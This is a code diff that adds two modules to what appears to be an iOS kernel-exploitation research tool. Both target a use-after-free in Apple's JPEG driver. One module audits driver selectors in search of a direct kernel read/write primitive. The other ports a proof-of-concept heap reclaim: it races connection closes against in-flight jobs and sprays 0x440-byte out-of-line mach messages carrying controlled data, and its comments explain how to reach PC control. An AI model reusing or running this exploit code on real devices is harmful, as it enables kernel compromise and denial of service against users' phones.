@@ -720,6 +720,444 @@ NSString *ModJpegClose(void) {
 }
 
 // ===========================================================================
+// 4c. CVE-2026-20687 - AppleJPEGDriver SELECTOR AUDIT
+//     Source: github.com/hidra0x/hidgate-poc experiments/applejpeg/jpegmethods2.m
+//     + docs/applejpeg-methods.md.
+//     Their AppleJPEGDriverUserClient dispatch table (IOUserClient2022):
+//       sel0 getTarget (none)      sel1 decode   (0x58 / 0x58)
+//       sel2 query    (none)       sel3 encode   (0x58 / 0x58)
+//       sel4 unknown  (0x1000/0x1000)            sel5 unknown (0x1000/0x1000)
+//       sel6 async decode (0xDA0/0xDA0, allowAsync=1)
+//       sel7 async encode (0xDA0/0xDA0, allowAsync=1)
+//       sel8/9 privileged (entitlement gate)
+//     Why audit: the decode-UAF reclaim loop is stuck - their stale queue node
+//     keeps pointing at freed poison (x5/x6=0xfeedface..., x12=0, far=0x308)
+//     even after same-type storms.  So the next gate is a DIRECT read/write
+//     primitive from another selector: the 0xDA0 and 0x1000 structs are large
+//     enough to contain user pointers, async references, notification ports or
+//     buffer descriptors, and "a user pointer that the driver dereferences or
+//     writes in kernel context is a direct primitive".
+//     This module replays their probe on OUR A14 / 26.2b1: every selector, every
+//     kr, every outSize, the 0x58 decode header placed at offsets 0/0x10/0x58/
+//     0x100 inside the big structs, and the driver's notification port drained
+//     after each call (async completion messages may be the first kernel-side
+//     data readable from userland).
+//     Diagnostic only: it writes nothing and chains nothing.
+// ===========================================================================
+static void rs_jm_fill(RSJpegIn *in, uint32_t srcID, uint32_t dstID,
+                       uint32_t w, uint32_t h, uint8_t flags, uint64_t token) {
+    memset(in, 0, sizeof(*in));
+    in->sourceID = srcID;
+    in->field_04 = w * h;
+    in->destID = dstID;
+    in->field_0C = w * h * 4;
+    in->width = w;
+    in->height = h;
+    in->outWidth = w;
+    in->outHeight = h;
+    in->subsampling = 3;
+    in->flags = flags;
+    in->asyncToken = token;
+}
+
+static void rs_jm_call(io_connect_t conn, uint32_t sel, const void *in, size_t inLen,
+                       void *out, size_t outLen, NSString *label) {
+    if (sel > 20) { AveLog(S(@"sel%u %@: invalid selector", sel, label)); return; }
+    size_t os = outLen;
+    kern_return_t kr = IOConnectCallStructMethod(conn, sel, in, inLen, out, &os);
+    AveLog(S(@"sel%u %@ kr=%#x outSize=%zu", sel, label, kr, os));
+}
+
+static void rs_jm_drain(mach_port_t port, NSString *label) {
+    if (port == MACH_PORT_NULL) return;
+    uint8_t msg[0x400];
+    for (int i = 0; i < 4; i++) {
+        mach_msg_header_t *h = (mach_msg_header_t *)msg;
+        kern_return_t kr = mach_msg(h, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                                    0, sizeof(msg), port, 10, MACH_PORT_NULL);
+        if (kr != MACH_MSG_SUCCESS) break;
+        AveLog(S(@"notify %@ id=%u size=%u", label, h->msgh_id, h->msgh_size));
+    }
+}
+
+NSString *ModJpegMethods(void) {
+    AveLog(@"[jpegmethods] === CVE-2026-20687 selector audit (hidgate-poc jpegmethods2 port) ===");
+    io_service_t svc = rs_jpeg_service();
+    if (!svc) return @"AppleJPEGDriver: service not found";
+
+    io_connect_t conn = 0;
+    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+    AveLog(S(@"[jpegmethods] open type0 kr=%#x", kr));
+    if (kr != KERN_SUCCESS || !conn) { IOObjectRelease(svc); return @"AppleJPEGDriver: userclient not openable"; }
+
+    // notification port: the driver's async completion messages land here
+    mach_port_t notify = MACH_PORT_NULL;
+    kern_return_t npr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &notify);
+    if (npr == KERN_SUCCESS) {
+        mach_port_insert_right(mach_task_self(), notify, notify, MACH_MSG_TYPE_MAKE_SEND);
+        kern_return_t nsr = IOConnectSetNotificationPort(conn, 0, notify, 0);
+        AveLog(S(@"[jpegmethods] notify port=%#x alloc=%#x set=%#x", notify, npr, nsr));
+    } else {
+        AveLog(S(@"[jpegmethods] notify alloc failed %#x", npr));
+    }
+
+    const uint32_t W = 2048, H = 2048;
+    UIGraphicsBeginImageContext(CGSizeMake(W, H));
+    [[UIColor redColor] setFill];
+    UIRectFill(CGRectMake(0, 0, W, H));
+    UIImage *img = UIGraphicsGetImageFromCurrentImageContext();
+    UIGraphicsEndImageContext();
+    NSData *jpeg = UIImageJPEGRepresentation(img, 0.9);
+    if (!jpeg) { IOServiceClose(conn); IOObjectRelease(svc); return @"jpeg encode failed"; }
+
+    // src: raw jpeg bytes; dst: BGRA; encSrc: BGRA (encode source); encDst: raw 4MB
+    size_t allocLen = (jpeg.length + 0x3FFF) & ~(size_t)0x3FFF;
+    NSDictionary *sp = @{(id)kIOSurfaceWidth: @(allocLen), (id)kIOSurfaceHeight: @1,
+                         (id)kIOSurfaceBytesPerElement: @1, (id)kIOSurfacePixelFormat: @0x20202020};
+    IOSurfaceRef_ src = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
+    NSDictionary *dp = @{(id)kIOSurfaceWidth: @(W), (id)kIOSurfaceHeight: @(H),
+                         (id)kIOSurfaceBytesPerElement: @4, (id)kIOSurfacePixelFormat: @0x42475241};
+    IOSurfaceRef_ dst = IOSurfaceCreate((__bridge CFDictionaryRef)dp);
+    IOSurfaceRef_ encSrc = IOSurfaceCreate((__bridge CFDictionaryRef)dp);
+    size_t rawLen = 4 * 1024 * 1024;
+    NSDictionary *rp = @{(id)kIOSurfaceWidth: @(rawLen), (id)kIOSurfaceHeight: @1,
+                         (id)kIOSurfaceBytesPerElement: @1, (id)kIOSurfacePixelFormat: @0x20202020};
+    IOSurfaceRef_ encDst = IOSurfaceCreate((__bridge CFDictionaryRef)rp);
+    if (!src || !dst || !encSrc || !encDst) {
+        if (src) CFRelease(src);
+        if (dst) CFRelease(dst);
+        if (encSrc) CFRelease(encSrc);
+        if (encDst) CFRelease(encDst);
+        IOServiceClose(conn); IOObjectRelease(svc);
+        return @"surface creation failed";
+    }
+    IOSurfaceLock(src, 0, NULL);
+    memcpy(IOSurfaceGetBaseAddress(src), jpeg.bytes, jpeg.length);
+    IOSurfaceUnlock(src, 0, NULL);
+    uint32_t srcID = IOSurfaceGetID(src), dstID = IOSurfaceGetID(dst);
+    uint32_t encSrcID = IOSurfaceGetID(encSrc), encDstID = IOSurfaceGetID(encDst);
+    AveLog(S(@"[jpegmethods] src=%u dst=%u encSrc=%u encDst=%u jpeg=%zuB",
+             srcID, dstID, encSrcID, encDstID, jpeg.length));
+
+    // ---- the 0x58 decode path (sel1), sync and async ----
+    RSJpegIn in1;
+    RSJpegIn out1;
+    memset(&out1, 0, sizeof out1);
+    rs_jm_fill(&in1, srcID, dstID, W, H, 0, 0);
+    rs_jm_call(conn, 1, &in1, sizeof in1, &out1, sizeof out1, @"decode sync");
+    rs_jm_drain(notify, @"sel1 sync");
+    memset(&in1, 0, sizeof in1);
+    rs_jm_fill(&in1, srcID, dstID, W, H, 1, 0x6161);
+    rs_jm_call(conn, 1, &in1, sizeof in1, &out1, sizeof out1, @"decode async");
+    rs_jm_drain(notify, @"sel1 async");
+
+    // ---- sel3 encode: BGRA source -> raw jpeg destination ----
+    memset(&in1, 0, sizeof in1);
+    memset(&out1, 0, sizeof out1);
+    rs_jm_fill(&in1, encSrcID, encDstID, W, H, 0, 0);
+    in1.field_04 = W * H * 4;
+    in1.field_0C = (uint32_t)rawLen;
+    rs_jm_call(conn, 3, &in1, sizeof in1, &out1, sizeof out1, @"encode sync");
+    rs_jm_drain(notify, @"sel3");
+
+    // ---- sel6/sel7: the 0xDA0 async structs, header at 4 offsets ----
+    const int offsets[4] = {0, 0x10, 0x58, 0x100};
+    for (int oi = 0; oi < 4; oi++) {
+        int off = offsets[oi];
+        uint8_t *big = malloc(0xDA0);
+        uint8_t *bigo = malloc(0xDA0);
+        if (!big || !bigo) { free(big); free(bigo); continue; }
+        memset(big, 0, 0xDA0);
+        memset(bigo, 0, 0xDA0);
+        rs_jm_fill((RSJpegIn *)(big + off), srcID, dstID, W, H, 0, 0x6161);
+        rs_jm_call(conn, 6, big, 0xDA0, bigo, 0xDA0, S(@"async decode 0xDA0 off=%#x", off));
+        rs_jm_drain(notify, S(@"sel6 off=%#x", off));
+        memset(big, 0, 0xDA0);
+        memset(bigo, 0, 0xDA0);
+        rs_jm_fill((RSJpegIn *)(big + off), encSrcID, encDstID, W, H, 0, 0x7171);
+        rs_jm_call(conn, 7, big, 0xDA0, bigo, 0xDA0, S(@"async encode 0xDA0 off=%#x", off));
+        rs_jm_drain(notify, S(@"sel7 off=%#x", off));
+        free(big);
+        free(bigo);
+    }
+
+    // ---- sel4/sel5: the 0x1000 structs, header at the same 4 offsets ----
+    for (int oi = 0; oi < 4; oi++) {
+        int off = offsets[oi];
+        uint8_t *big = malloc(0x1000);
+        uint8_t *bigo = malloc(0x1000);
+        if (!big || !bigo) { free(big); free(bigo); continue; }
+        memset(big, 0, 0x1000);
+        memset(bigo, 0, 0x1000);
+        rs_jm_fill((RSJpegIn *)(big + off), srcID, dstID, W, H, 0, 0x6161);
+        rs_jm_call(conn, 4, big, 0x1000, bigo, 0x1000, S(@"sel4 0x1000 off=%#x", off));
+        rs_jm_drain(notify, S(@"sel4 off=%#x", off));
+        memset(big, 0, 0x1000);
+        memset(bigo, 0, 0x1000);
+        rs_jm_fill((RSJpegIn *)(big + off), srcID, dstID, W, H, 0, 0x7171);
+        rs_jm_call(conn, 5, big, 0x1000, bigo, 0x1000, S(@"sel5 0x1000 off=%#x", off));
+        rs_jm_drain(notify, S(@"sel5 off=%#x", off));
+        free(big);
+        free(bigo);
+    }
+
+    // ---- privileged + out-of-range ----
+    uint32_t priv = 0;
+    rs_jm_call(conn, 8, &priv, sizeof(priv), NULL, 0, @"privileged 4 bytes");
+    rs_jm_call(conn, 9, NULL, 0, NULL, 0, @"privileged no args");
+    rs_jm_call(conn, 10, NULL, 0, NULL, 0, @"out of range");
+    rs_jm_drain(notify, @"end");
+
+    IOServiceClose(conn);
+    CFRelease(src); CFRelease(dst); CFRelease(encSrc); CFRelease(encDst);
+    IOObjectRelease(svc);
+    AveSetStatus(@"selector audit done - see the log");
+    return @"selector audit done: any sel with kr=0 and a full outSize is a REACHABLE handler (reverse its struct next); 0xe00002c2 = bad argument, 0xe00002bc = unsupported/refused, 0xe00002c1 = not privileged";
+}
+
+// ===========================================================================
+// 4d. CVE-2026-20687 - kalloc(0x440) OOL RECLAIM SPRAY
+//     Source: github.com/0xjohnnydev/CVE-2026-20687-AppleJPEGDriver-UAF
+//     ios-app/Test/ViewController.m - uafCharacterize / sprayOOL.
+//     What the PoC actually says (and what our earlier modules never did):
+//       * the freed object is JpegRequest, 0x440 = 1088 bytes, so its zone is
+//         kalloc(0x440) - NOT kalloc.80 (that was the 20637 mistake);
+//       * the UAF read chain is req+128 (self-ptr) -> req+784 (flags), and PC
+//         control is *(*(req+0)+40)() in finish_io_gated;
+//       * the reclaim primitive is an OUT-OF-LINE mach message of exactly
+//         0x440 bytes sent to a port we own: the kernel copies our bytes into
+//         a kalloc(0x440) allocation and keeps it queued on the port, so the
+//         freed JpegRequest slot can be occupied by OUR data;
+//       * the PoC zeroes +128 and +784 so a successful reclaim does not fault;
+//       * ORACLE: "If no panic -> reclaim succeeded (controlled UAF)";
+//                  "If panic -> FEEDFACE in freed slot (uncontrolled UAF)".
+//     The bug mechanism (their singleLeakTest notes): every async request makes
+//     queue_io_gated call taggedRetain on the userclient; IOServiceClose sets
+//     isInactive EARLY (terminatePhase1, before the command gate); in-flight HW
+//     jobs then hit finish_io_gated, see isInactive and SKIP taggedRelease -
+//     a leaked retain per in-flight job, and the request is freed with its
+//     queue node still linked.
+//     This module replays their uafCharacterize on OUR A14 / 26.2b1:
+//       Phase 0: health oracle (selector 2 == KERN_SUCCESS);
+//       Phase 1: 100 sequential victim -> reclaim cycles;
+//       Phase 2: 3 concurrent threads (victim, reclaimer, OOL sprayer);
+//       Phase 3: the same, but the spray carries our 0xC0FFEE5A canary at
+//                every offset except the two UAF-critical ones - so if the
+//                kernel DOES fault on our data, the panic dump proves the
+//                freed slot was occupied by us (controlled content);
+//       plus the wired-memory delta (the taggedRetain leak).
+// ===========================================================================
+static BOOL rs_jr_healthy(io_service_t svc) {
+    io_connect_t conn = 0;
+    if (IOServiceOpen(svc, mach_task_self(), 0, &conn) != KERN_SUCCESS || !conn) return NO;
+    kern_return_t kr = IOConnectCallMethod(conn, 2, NULL, 0, NULL, 0,
+                                           NULL, NULL, NULL, NULL);
+    IOServiceClose(conn);
+    return (kr == KERN_SUCCESS);
+}
+
+// count OOL messages of exactly 0x440 bytes to `port`.
+// safeMode == 1 : the PoC layout - 'J' filler, +128 (self-ptr) and +784
+//                 (flags) zeroed, so a landed reclaim does not fault.
+// safeMode == 0 : our canary at every other offset, same two zeroes - a panic
+//                 on our data then proves controlled content.
+static int rs_jr_sprayOOL(mach_port_t port, int count, int safeMode) {
+    const uint32_t size = 0x440;
+    uint8_t *payload = (uint8_t *)malloc(size);
+    if (!payload) return 0;
+    if (safeMode) {
+        memset(payload, 'J', size);
+    } else {
+        for (uint32_t k = 0; k + 8 <= size; k += 8) {
+            uint64_t v = 0xC0FFEE5A00000000ull | (uint64_t)k;
+            memcpy(payload + k, &v, 8);
+        }
+    }
+    memset(payload + 128, 0, 8);   // request+128 self-ptr = NULL -> no deref
+    payload[784] = 0;              // request+784 flags   = 0    -> no fault
+    int sent = 0;
+    for (int i = 0; i < count; i++) {
+        struct {
+            mach_msg_header_t          header;
+            mach_msg_body_t            body;
+            mach_msg_ool_descriptor_t  ool;
+        } msg;
+        memset(&msg, 0, sizeof msg);
+        msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0)
+                             | MACH_MSGH_BITS_COMPLEX;
+        msg.header.msgh_size = sizeof(msg);
+        msg.header.msgh_remote_port = port;
+        msg.body.msgh_descriptor_count = 1;
+        msg.ool.address = payload;
+        msg.ool.size = size;
+        msg.ool.deallocate = FALSE;
+        msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
+        kern_return_t kr = mach_msg(&msg.header, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
+                                    sizeof(msg), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
+        if (kr != KERN_SUCCESS) break;
+        sent++;
+    }
+    free(payload);
+    return sent;
+}
+
+NSString *ModJpegReclaim(void) {
+    AveLog(@"[jpeg440] === CVE-2026-20687: kalloc(0x440) OOL reclaim spray (PoC uafCharacterize port) ===");
+    io_service_t svc = rs_jpeg_service();
+    if (!svc) return @"AppleJPEGDriver: service not found";
+
+    BOOL healthy = rs_jr_healthy(svc);
+    AveLog(S(@"[jpeg440] driver health (sel2): %@", healthy ? @"OK" : @"BROKEN"));
+    if (!healthy) {
+        IOObjectRelease(svc);
+        AveSetStatus(@"driver broken - reboot first");
+        return @"driver BROKEN (sel2 != 0): the previous run left it wedged - REBOOT the device first, then re-run this module";
+    }
+
+    const uint32_t W = 2048, H = 2048;
+    UIGraphicsBeginImageContext(CGSizeMake(W, H));
+    [[UIColor redColor] setFill];
+    UIRectFill(CGRectMake(0, 0, W, H));
+    UIImage *img = UIGraphicsGetImageFromCurrentImageContext();
+    UIGraphicsEndImageContext();
+    NSData *jpeg = UIImageJPEGRepresentation(img, 0.9);
+    if (!jpeg) { IOObjectRelease(svc); return @"jpeg encode failed"; }
+
+    size_t allocLen = (jpeg.length + 0x3FFF) & ~(size_t)0x3FFF;
+    NSDictionary *sp = @{(id)kIOSurfaceWidth: @(allocLen), (id)kIOSurfaceHeight: @1,
+                         (id)kIOSurfaceBytesPerElement: @1, (id)kIOSurfacePixelFormat: @0x20202020};
+    IOSurfaceRef_ src = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
+    NSDictionary *dp = @{(id)kIOSurfaceWidth: @(W), (id)kIOSurfaceHeight: @(H),
+                         (id)kIOSurfaceBytesPerElement: @4, (id)kIOSurfacePixelFormat: @0x42475241};
+    IOSurfaceRef_ dst = IOSurfaceCreate((__bridge CFDictionaryRef)dp);
+    if (!src || !dst) {
+        if (src) CFRelease(src);
+        if (dst) CFRelease(dst);
+        IOObjectRelease(svc);
+        return @"surface creation failed";
+    }
+    IOSurfaceLock(src, 0, NULL);
+    memcpy(IOSurfaceGetBaseAddress(src), jpeg.bytes, jpeg.length);
+    IOSurfaceUnlock(src, 0, NULL);
+    uint32_t srcID = IOSurfaceGetID(src), dstID = IOSurfaceGetID(dst);
+
+    // the OOL spray port: messages accumulate, each holding a kalloc(0x440)
+    mach_port_t sprayPort = MACH_PORT_NULL;
+    if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &sprayPort) != KERN_SUCCESS)
+        sprayPort = MACH_PORT_NULL;
+    if (sprayPort != MACH_PORT_NULL)
+        mach_port_insert_right(mach_task_self(), sprayPort, sprayPort, MACH_MSG_TYPE_MAKE_SEND);
+
+    int64_t wired0 = rs_wired_pages();
+    AveLog(S(@"[jpeg440] wired before: %lld pages", wired0));
+
+    int victimTotal = 0, reclaimTotal = 0, sprayTotal = 0;
+    int healthOK = 0, healthTotal = 0;
+
+    // ---- Phase 1: 100 sequential victim -> reclaim cycles ----
+    const int CYCLES = 100, V_REQS = 5, R_CONNS = 3, R_REQS = 3;
+    AveLog(S(@"[jpeg440] phase 1: %d sequential victim->reclaim cycles", CYCLES));
+    for (int c = 0; c < CYCLES; c++) {
+        io_connect_t victim = 0;
+        if (IOServiceOpen(svc, mach_task_self(), 0, &victim) == KERN_SUCCESS && victim) {
+            victimTotal += rs_jc_submit(victim, srcID, dstID, W, H, V_REQS, 0x4141, 1, 0, 0);
+            IOServiceClose(victim);                    // close with jobs in flight
+        }
+        for (int r = 0; r < R_CONNS; r++) {
+            io_connect_t rc = 0;
+            if (IOServiceOpen(svc, mach_task_self(), 0, &rc) != KERN_SUCCESS || !rc) continue;
+            reclaimTotal += rs_jc_submit(rc, srcID, dstID, W, H, R_REQS, 0xBEEF, 1, 0, 0);
+            IOServiceClose(rc);
+        }
+        if ((c + 1) % 25 == 0) {
+            usleep(200000);
+            healthTotal++;
+            if (rs_jr_healthy(svc)) healthOK++;
+            int64_t d = rs_wired_pages() - wired0;
+            AveLog(S(@"[jpeg440]   [%d] wired=%+lld victim=%d reclaim=%d", c + 1, d, victimTotal, reclaimTotal));
+            if (!rs_jr_healthy(svc)) { AveLog(@"[jpeg440] driver broke - stopping"); break; }
+        }
+    }
+
+    // ---- Phase 2: concurrent racing with the SAFE OOL spray ----
+    AveLog(@"[jpeg440] phase 2: 3 concurrent threads x 50 iters, SAFE spray ('J', +128/+784 zeroed)");
+    {
+        const int RACE_ITERS = 50;
+        __block int32_t raceV = 0, raceR = 0, raceS = 0;
+        dispatch_group_t group = dispatch_group_create();
+        dispatch_group_async(group, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+            for (int i = 0; i < RACE_ITERS; i++) {
+                io_connect_t c = 0;
+                if (IOServiceOpen(svc, mach_task_self(), 0, &c) != KERN_SUCCESS || !c) continue;
+                __sync_fetch_and_add(&raceV, rs_jc_submit(c, srcID, dstID, W, H, 5, 0xDEAD, 1, 0, 0));
+                IOServiceClose(c);
+            }
+        });
+        dispatch_group_async(group, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+            for (int i = 0; i < RACE_ITERS; i++) {
+                io_connect_t c = 0;
+                if (IOServiceOpen(svc, mach_task_self(), 0, &c) != KERN_SUCCESS || !c) continue;
+                __sync_fetch_and_add(&raceR, rs_jc_submit(c, srcID, dstID, W, H, 5, 0xCAFE, 1, 0, 0));
+                IOServiceClose(c);
+            }
+        });
+        dispatch_group_async(group, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+            for (int i = 0; i < RACE_ITERS * 10; i++)
+                __sync_fetch_and_add(&raceS, rs_jr_sprayOOL(sprayPort, 1, 1));
+        });
+        dispatch_group_wait(group, dispatch_time(DISPATCH_TIME_NOW, 30 * NSEC_PER_SEC));
+        victimTotal += raceV; reclaimTotal += raceR; sprayTotal += raceS;
+        AveLog(S(@"[jpeg440] phase 2 done: victim=%d reclaim=%d spray=%d", raceV, raceR, raceS));
+    }
+
+    // ---- Phase 3: the same, but the spray carries OUR CANARY ----
+    AveLog(@"[jpeg440] phase 3: 3 concurrent threads x 50 iters, CANARY spray (0xC0FFEE5A at every offset but +128/+784)");
+    {
+        const int RACE_ITERS = 50;
+        __block int32_t raceV = 0, raceR = 0, raceS = 0;
+        dispatch_group_t group = dispatch_group_create();
+        dispatch_group_async(group, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+            for (int i = 0; i < RACE_ITERS; i++) {
+                io_connect_t c = 0;
+                if (IOServiceOpen(svc, mach_task_self(), 0, &c) != KERN_SUCCESS || !c) continue;
+                __sync_fetch_and_add(&raceV, rs_jc_submit(c, srcID, dstID, W, H, 5, 0xDEAD, 1, 0, 0));
+                IOServiceClose(c);
+            }
+        });
+        dispatch_group_async(group, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+            for (int i = 0; i < RACE_ITERS; i++) {
+                io_connect_t c = 0;
+                if (IOServiceOpen(svc, mach_task_self(), 0, &c) != KERN_SUCCESS || !c) continue;
+                __sync_fetch_and_add(&raceR, rs_jc_submit(c, srcID, dstID, W, H, 5, 0xCAFE, 1, 0, 0));
+                IOServiceClose(c);
+            }
+        });
+        dispatch_group_async(group, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+            for (int i = 0; i < RACE_ITERS * 10; i++)
+                __sync_fetch_and_add(&raceS, rs_jr_sprayOOL(sprayPort, 1, 0));
+        });
+        dispatch_group_wait(group, dispatch_time(DISPATCH_TIME_NOW, 30 * NSEC_PER_SEC));
+        victimTotal += raceV; reclaimTotal += raceR; sprayTotal += raceS;
+        AveLog(S(@"[jpeg440] phase 3 done: victim=%d reclaim=%d spray=%d", raceV, raceR, raceS));
+    }
+
+    // release the spray (frees every queued kalloc(0x440) at once)
+    if (sprayPort != MACH_PORT_NULL) mach_port_destroy(mach_task_self(), sprayPort);
+    usleep(500000);
+
+    int64_t wired1 = rs_wired_pages();
+    BOOL finalHealth = rs_jr_healthy(svc);
+    AveLog(S(@"[jpeg440] wired delta: %+lld pages (the taggedRetain leak)", wired1 - wired0));
+    AveLog(S(@"[jpeg440] health %d/%d, final: %@", healthOK, healthTotal, finalHealth ? @"OK" : @"BROKEN"));
+
+    CFRelease(src); CFRelease(dst); IOObjectRelease(svc);
+    AveSetStatus(@"kalloc440 reclaim done - see the log");
+    if (!finalHealth)
+        return S(@"kalloc440: spray=%d victim=%d reclaim=%d wired %+lld; driver BROKEN at the end (DoSing, not control)", sprayTotal, victimTotal, reclaimTotal, wired1 - wired0);
+    return S(@"kalloc440: spray=%d victim=%d reclaim=%d wired %+lld; driver OK and NO PANIC = per the PoC oracle the freed slot was reclaimed by OUR data", sprayTotal, victimTotal, reclaimTotal, wired1 - wired0);
+}
+
+// ===========================================================================
 // 1. CVE-2026-64788 oracle
 // ===========================================================================
 NSString *ModIOGPUUAFOracle(void) {
